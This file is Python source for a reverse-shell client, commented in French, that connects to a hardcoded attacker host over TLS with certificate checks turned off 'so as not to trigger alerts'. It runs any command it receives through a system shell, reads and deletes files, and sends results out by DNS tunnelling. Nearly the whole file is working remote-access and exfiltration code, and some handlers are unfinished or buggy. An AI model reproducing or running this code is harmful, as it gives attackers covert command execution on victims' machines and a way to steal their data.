# client_revershell
# Version 0.5
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies
import socket       # communication entre l'attaque et la cible
import ssl          # chiffrement des échanges
import subprocess   # retourner le résultats des commandes à l'attaquant
import os           # exécuter des commandes systèmes
import shutil
import threading       # manipuler les fichiers
from dns_client import *   # exfiltration via DNS

# /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
HOST = '192.168.1.6'
PORT = 25566
DNS_PORT = 53
KEY = b'267eAs?594f6C:5m'
IV = b'a5E8s9!AF272344_'
# taille des messages : 128kB
BUFFER_SIZE = 1024 * 128

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
# certificat autosigné : désactivation des vérifications
# pour ne pas déclenché d'alerte
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
wrappedSocket.connect((HOST, PORT))

def dns_resolver(host, port):
    # Créer une instance de resolver
    res = resolver.Resolver()

    # Spécifier le serveur DNS
    res.nameservers = [HOST]
    res.port = PORT

    return res
# à mettre dans une fonction
# send socket + encoding
# + d'espace
# command

def shell_interpreter(wrappedSocket):
    try:
        while True:
            received_data = wrappedSocket.recv(BUFFER_SIZE)
            # Send the output of the command over the SSL connection
            # Execute a system command
            cmd = received_data.decode().split()
            # la commande a-t-elle des paramètres ?
            if cmd[0] == "cd" and os.path.exists(cmd[1]):
                os.chdir(cmd[1])
                output = "Changed directory to {}".format(os.getcwd())
                output = chunk(output)
                send_dns(output)
                #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "pwd":
                output = os.getcwd()
                output = chunk(output)
                send_dns(output)
                #wrappedSocket.sendall(output.encode()) 
            elif cmd[0] == "cp":
                if cmd[2] and not os.path.exists(cmd[2]):
                    shutil.copy2(cmd[1], cmd[2])
                    output = f"{cmd[2]} has been created!"
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
                elif os.path.exists(cmd[2]):
                    output = f"{cmd[2]} already exists!"
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
                else:
                    output = b"usage: cp <source> <destination>"
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "ls":
                if os.name == 'nt':
                    output = subprocess.check_output(["dir"], shell=True, text=True)
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
                else:
                    output = subprocess.check_output(["ls -al"], shell=True, text=True)
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "rm":
                if os.path.exists(cmd[1]):
                    os.remove(cmd[1])
                    output = f"{cmd[1]} removed!"
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
                else:
                    output = f"{cmd[1]} does not exist"
                    output = chunk(output)
                    send_dns(output)
                    #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "whoami":
                output = os.environ.get('USERNAME')
                output = chunk(output)
                send_dns(output)
                #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "cat":
                output = open(cmd[1], 'r')
                output = output.read()
                output = chunk(output)
                send_dns(output)
                #wrappedSocket.sendall(output.encode())
            elif cmd[0] == "download":
                file = open(cmd[1], 'r')
                wrappedSocket.sendall(cmd[0].encode())
            elif cmd[0] == "upload":
                wrappedSocket.sendall(cmd[0].encode())
            elif cmd[0] == "ping":
                wrappedSocket.sendall(cmd[0].encode())
            else:
                command = subprocess.Popen(cmd, shell=True,
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
                output, err = command.communicate()
                if output:
                    output = chunk(output.decode())
                    send_dns(output)
                    #wrappedSocket.sendall(output) 
                elif err:
                    err = chunk(err.decode())
                    send_dns(err)
                    #wrappedSocket.sendall(err)
                else:
                    message = chunk(b"[-] Error: couldn't send data")
                    send_dns(message)
                    #wrappedSocket.sendall("[-] Error: couldn't send data".encode())
    except Exception as e:
        print(e)
        exit(-1)
    finally:
        wrappedSocket.shutdown(socket.SHUT_RDWR)
        wrappedSocket.close()
        exit(0)

if __name__ == "__main__":
    thread_dns = threading.Thread(target=shell_interpreter, args=[wrappedSocket])
    thread_dns.start()
    dns_resolver(HOST, DNS_PORT)